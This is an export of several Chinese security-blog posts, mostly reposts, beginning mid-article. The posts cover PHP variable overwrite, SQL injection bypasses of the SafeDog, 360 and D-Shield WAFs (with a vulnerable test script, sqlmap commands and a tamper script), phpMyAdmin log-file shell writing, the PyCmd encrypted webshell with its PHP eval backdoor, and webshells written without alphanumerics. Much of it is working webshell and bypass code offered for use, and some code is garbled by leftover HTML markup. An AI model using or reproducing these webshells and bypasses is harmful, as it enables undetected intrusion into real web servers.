在开头我们定义了一个数组d然后我们使用extract()函数并将array参数填写为数组d此时数组d中的键名将当做新的变量名来创建一个新的变量，而新的变量的值即为在数组中对应的值。（注意如果之前有声明过同一个变量,那么该变量将被覆盖。如果之后才声明将不会出现变量覆盖的现象）此时输出结果为： 可以看到我们之前并未声明过a、b、c变量，但是仍可输出。 3.parse_str()定义：把查询字符串解析到变量中语法：parse_str(string,array)string为必选参数array为可选参数举个例子 可以看到此函数将name和age初始化成了变量，且值为等号右边的值当array参数存在时： 4.import_request_varibles()定义将 GET/POST/Cookie 变量导入到全局作用域中此函数相当于开启全局变量注册语法import_request_variables(string $types ,string $prefix )第一个参数为必选第二个参数为可选例子：import_request_variables(“GPC”)使用此方法即可开启对_POST、_GET、_COOKIE的全局变量注册当第二个参数存在时将会加上一个前缀 三、经典案例1.经典$$变量覆盖1234foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123; foreach($$_request as $_key =&gt; $_value) &#123; $$_key = addslashes($_value); &#125; 这是一段非常经典的$$注册变量导致的变量覆盖代码，很多应用上都出现过可以看出$_key为COOKIE POST GET中的参数比如提交?a=1 则$_key的值为a而下面的$$_key则会有$a的意思，结合起来就变成了$a = addslashes($_value)这样便会覆盖原有的变量a的值我们来运行一下： 可以看到变量a被我们覆盖掉了 2.部分cms变量覆盖案例：MetInfo全局变量覆盖另类突破防注入http://www.weixianmanbu.com/article/84.html齐博CMS变量覆盖导致sql注入漏洞http://bobao.360.cn/learning/detail/291.htmlDestoon 20140530最新版超全局变量覆盖导致的安全问题http://0day5.com/archives/1855/ 四、变量覆盖玩出新花样之一句话木马bypass某狗经过我们简单的测试，我们可以了解到：当我们使用assert函数时，如果函数的参数是可控，那么某狗拦截。例如:assert($_POST[a])或者$a=$_POST[c];assert($a)这些都是拦截 但是如果我们只有assert($a)这一句时，我们发现他就不会进行拦截了 这就值得我们思考了，为什么这样不会拦截呢？我认为应该是某狗觉得这个变量a是不可控的，所以就认为这不是木马那如果这时我们在联系一下变量覆盖漏洞呢？在这里我选用了上面的案例代码12345foreach(array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request) &#123; foreach($$_request as $_key =&gt; $_value) &#123; $$_key = addslashes($_value); &#125;&#125; 把addslashes()删掉 然后把代码精简下1foreach(array(&apos;_POST&apos;) as $_r)&#123;foreach($$_r as $_k =&gt; $_v) &#123;$$_k = $_v;&#125;&#125; 最终代码为1&lt;?php foreach(array(&apos;_POST&apos;) as $_r)&#123;foreach($$_r as $_k =&gt; $_v) &#123;$$_k = $_v;&#125;&#125;;assert($a);?&gt; 成功bypass]]></content>
      <categories>
        <category>原创栏目</category>
      </categories>
      <tags>
        <tag>奇淫技巧</tag>
        <tag>过狗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]绕过360,安全狗,D盾等进行Sql注入]]></title>
    <url>%2F2017%2F%5B%E8%BD%AC%5D%E7%BB%95%E8%BF%87360%2C%E5%AE%89%E5%85%A8%E7%8B%97%2CD%E7%9B%BE%E7%AD%89%E8%BF%9B%E8%A1%8CSql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[作者:Bypass0x01 前言在测试过程中，经常会遇到一些主机防护软件，对这方面做了一些尝试，可成功bypass了GET和POST的注入防御，分享一下姿势。 0x02 环境搭建Windows Server 2003+phpStudy sql注入点测试代码：sql.php12345678910111213141516171819&lt;?php$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);if (!$con) &#123; die(&apos;Could not connect: &apos; . mysql_error()); &#125;mysql_select_db(&quot;test&quot;, $con);$id = $_REQUEST[ &apos;id&apos; ];$query = &quot;SELECT * FROM admin WHERE username = $id &quot;;$result = mysql_query($query);while($row = mysql_fetch_array($result)) &#123; echo $row[&apos;0&apos;] . &quot; &quot; . $row[&apos;1&apos;]; echo &quot;&amp;lt;br /&amp;gt;&quot;; &#125;echo &quot;&amp;lt;br/&amp;gt;&quot;;echo $query;mysql_close($con);?&gt; 运行效果： 0x03 Bypass 过程对不同waf做了一些尝试，关于SQL注入bypass，可以考虑划分为3种： 1、完全bypass（union select+select from） 2、部分bypass（union select 或select from） 3、获取一些敏感信息（如version()、database()等） A、Union+select 先考虑如何绕过union+select，可以考虑一下几种形式 1、最常见形式 %20、+、/**/ 2、Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%20,%a0 3、内联注释 /!12345select/ 通过组合测试，可以发现 union%0a/!12345select/ 1,2 可以绕过防御。 B、select+from select+from 也可以通过同样的组合形式绕过防御。 至此已完全绕过union+select+from。 0x04 自动化注入编写tamper bypass脚本，来利用sqlmap来跑数据 先看一下原始sqlmap的效果：1sqlmap.py -u http://192.168.106.130/config/sql.php?id=1 --flush-session --dbs 失败 加载tamper脚本，可成功获取数据。1sqlmap.py -u http://192.168.106.130/config/sql.php?id=1 --flush-session --technique=U --tamper=&quot;360safe.py&quot; --dbs tamper脚本：12345678910111213141516171819202122232425262728#!/usr/bin/env python&quot;&quot;&quot;write by Aaron&quot;&quot;&quot;from lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): &quot;&quot;&quot; Replaces keywords &amp;gt;&amp;gt;&amp;gt; tamper(&apos;UNION SELECT id FROM users&apos;) &apos;union%0a/*!12345select*/id%0a/*!12345from*/users&apos; &quot;&quot;&quot; if payload: payload=payload.replace(&quot; ALL SELECT &quot;,&quot;%0a/*!12345select*/&quot;) payload=payload.replace(&quot;UNION SELECT&quot;,&quot;union%0a/*!12345select*/&quot;) payload=payload.replace(&quot; FROM &quot;,&quot;%0a/*!12345from*/&quot;) payload=payload.replace(&quot;CONCAT&quot;,&quot;CONCAT%23%0a&quot;) payload=payload.replace(&quot;CASE &quot;,&quot;CASE%23%0a&quot;) payload=payload.replace(&quot;CAST(&quot;,&quot;/*!12345CASt(*/&quot;) payload=payload.replace(&quot;DATABASE()&quot;,&quot;database%0a()&quot;) return payload&lt;/pre&gt;&lt;div class=&quot;cnblogs_code_toolbar&quot;&gt;&lt;span class=&quot;cnblogs_code_copy&quot;&gt;&lt;a title=&quot;复制代码&quot;&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt; 这边主要是针对union select查询进行的关键字替换，测试过程中，可以发现利用tamper脚本来bypass的弊端，sqlmap的部分payload是固定的，部分关键字会被waf拦截，需要一步步调试，总结，测试哪些关键字是被拦截的，如何绕过关键字的检测等，还是挺麻烦。 0x05 END最好的自动化注入工具：可以考虑自己编写一个自动化注入工具，灵活的自定义payload来获取数据库信息。 目前的测试成果，可成功bypass注入防御，如 安全狗、云锁、360主机卫士、D盾_IIS防火墙等主机防护软件及各种云waf，有些姿势都在用。 原文链接：https://www.cnblogs.com/xiaozi/p/7275134.html]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>奇淫技巧</tag>
        <tag>D盾</tag>
        <tag>过狗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]phpmyadmin日志拿shell]]></title>
    <url>%2F2017%2F%5B%E8%BD%AC%5Dphpmyadmin%E6%97%A5%E5%BF%97%E6%8B%BFshell%2F</url>
    <content type="text"><![CDATA[作者：珍惜少年时前提：条件是root用户。思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接之！ 要先把general log设置为ON 然后将文件修改日志文件名修改。 本来是在mysql下的一个log日志文件的，我重新改到了phpstudy目录下然后命名为def2.php 然后随便执行一条sql语句。 菜刀连接之。 原文链接：https://www.cnblogs.com/xishaonian/p/6622818.html]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>phpmyadmin</tag>
        <tag>奇淫技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]利用PyCmd加密隐形木马，成功绕过D盾]]></title>
    <url>%2F2017%2F%5B%E8%BD%AC%5D%E5%88%A9%E7%94%A8PyCmd%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC%EF%BC%8C%E6%88%90%E5%8A%9F%E7%BB%95%E8%BF%87D%E7%9B%BE%2F</url>
    <content type="text"><![CDATA[作者：nmask 之前写了一个基于python的一句话木马客户端程序，这个程序的作用大致就是为了绕过防护设备，使敏感数据能在网络里自由穿梭。由于编程能力有限，当时以python程序作为客户端，php代码作为服务端，勉强能用，但是缺乏jsp的服务端，使之功能很局限。幸好有大神caomei相助，帮助实现了jsp端的代码，故将两者相结合，方便使用。 PyCmd适用环境当服务器允许上传任意文件，且对文件内容不进行审计检查，但由于其网络边界有防火墙会拦截审计通信的数据。这时我们能成功上传一句话木马，然而连接菜刀的时候会出现500错误，此时可以使用pycmd工具，因为其会对互相通信的内容加密处理。 PyCmd使用我这里准备了2个靶机，分别装有php与jsp的运行环境，用来模拟真实的网站服务器。 为了方便，我已经把服务端木马程序放到了服务器网站目录下： php网站木马地址：10.0.3.13/test/p.php jsp网站木马地址：192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp 查看shell的情况： 此时，运行PyCmd.py程序：1python PyCmd.py -u http://10.0.3.13/test/p.php -p test [--proxy] 或者1python PyCmd.py -u http://192.168.10.149:8080/headgmp/upload/2017_07_13/11.jsp -p test [--proxy] 程序会自动判断输入的网站类型，这里是jsp类型的网站。 运行程序可输入以下参数： -h 查看帮助信息 -u 网站木马地址 -p 木马shell密码 –proxy 开启本地代理（方便调试）注：当开启本地调试，需运行Fiddler程序，或者其他抓包软件。 PyCmd数据加密PyCmd程序的长处在于它对往来的数据进行了加密，可以绕过防火墙对数据内容的校验。 当执行cmd命令时，通过Fiddler抓包查看数据： 查看回报信息： PyCmd木马隐身用D盾扫描上传的木马服务端文件，显示为正常文件，成功躲过查杀（2016.9.18日检测结果） 这里演示php木马查杀： &lt;?php $string=”; $password=’test’; if(isset($_POST[$password])){ $hex=$_POST[$password]; for($i=0;$i&lt;strlen($hex)-1;$i+=2){ $string.=chr(hexdec($hex[$i].$hex[$i+1])); } @eval($string); }else{ echo “This is a Test!”; } ?&gt; 工具下载PyCmd 下载地址 项目地址：https://github.com/tengzhangchao/PyCmd 说明：绕过防火墙检测的方法很多，这里只是提供了一种思路，pycmd是我去年写的一款工具，最近打算完善其功能，代码已经开源。 原文连接：https://thief.one/2016/09/18/PyCmd-%E5%8A%A0%E5%AF%86%E9%9A%90%E5%BD%A2%E6%9C%A8%E9%A9%AC/]]></content>
      <categories>
        <category>神兵利器</category>
      </categories>
      <tags>
        <tag>奇淫技巧</tag>
        <tag>D盾</tag>
        <tag>webshell</tag>
        <tag>过狗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]一些不包含数字和字母的webshell]]></title>
    <url>%2F2017%2F%5B%E8%BD%AC%5D%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%8C%85%E5%90%AB%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8D%E7%9A%84webshell%2F</url>
    <content type="text"><![CDATA[作者：离别歌正文：在小密圈提了个问题，“如何编写一个不使用数字和字母的webshell”，并具体成如下代码：1234&lt;?phpif(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) &#123; eval($_GET[&apos;shell&apos;]);&#125; 那么，这个代码如何利用？ 思路首先，明确思路。我的核心思路是，将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如“assert”，然后动态执行之即可。 那么，变换方法 将是解决本题的要点。 不过在此之前，我需要说说php5和7的差异。 php5中assert是一个函数，我们可以通过$f=&#39;assert&#39;;$f(...);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。 方法一这是最简单、最容易想到的方法。在PHP中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到a-z中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。 得到如下的结果（因为其中存在很多不可打印字符，所以我用url编码表示了）：12345&lt;?php$=(&apos;%01&apos;^&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%13&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;).(&apos;%13&apos;^&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%05&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;).(&apos;%12&apos;^&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;%14&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;); // $=&apos;assert&apos;;$=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $=&apos;POST&apos;;$__=$$;$($[_]); // assert($POST[]); 执行结果如下： 方法二和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的“异或”，方法二使用的是位运算里的“取反”。 方法二利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，比如&#39;和&#39;{2}的结果是&quot;\x8c&quot;，其取反即为字母s： 利用这个特性，我找了一篇文章（ https://www.leavesongs.com/THINK/answer.html ），自动选择了其中一些汉字，生成如下答案：12345678910111213&lt;?php$=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);$_=$/$__;$_=&apos;&apos;;$=&quot;瞰&quot;;$_.=~($&#123;$&#125;);$__=&quot;和&quot;;$_.=~($&#123;$&#125;);$_=&quot;和&quot;;$_.=~($&#123;$&#125;);$_=&quot;的&quot;;$_.=~($&#123;$&#125;);$__=&quot;半&quot;;$_.=~($&#123;$&#125;);$__=&quot;始&quot;;$_.=~($&#123;$__&#125;);$_=&apos;&apos;;$__=&quot;俯&quot;;$_.=~($_&#123;$&#125;);$=&quot;瞰&quot;;$__.=~($_&#123;$&#125;);$=&quot;次&quot;;$__.=~($&#123;$&#125;);$_=&quot;站&quot;;$_.=~($__&#123;$&#125;);$=$$__;$_($[$]); 这个答案还利用了PHP的弱类型特性。因为要获取&#39;和&#39;{2}，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故true+true==2，也就是(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)==2。 方法三那么，如果不用位运算这个套路，能不能搞定这题呢？有何不可。 这就得借助PHP的一个小技巧，先看文档： http://php.net/manual/zh/language.operators.increment.php 也就是说，&#39;a&#39;++ =&gt; &#39;b&#39;，&#39;b&#39;++ =&gt; &#39;c&#39;… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。 那么，如何拿到一个值为字符串’a’的变量呢？ 巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array： 再取这个字符串的第一个字母，就可以获得’A’了。 利用这个技巧，我编写了如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])，无需获取小写a）：123456789101112131415161718192021222324252627282930313233343536&lt;?php$=[];$=@&quot;$&quot;; // $=&apos;Array&apos;;$=$[&apos;!&apos;==&apos;@&apos;]; // $=$[0];$=$; // A$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$__.=$; // S$_.=$; // S$=$;$++;$++;$++;$++; // E $__.=$;$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // R$.=$;$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // T$.=$__;$_=&apos;&apos;;$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // P$__.=$;$=$;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // O$__.=$;$=$_;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // S$__.=$;$=$_;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++;$++; // T$__.=$__;$=$$__;$($[]); // ASSERT($POST[]); 执行结果： 原文链接：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>奇淫技巧</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
</search>
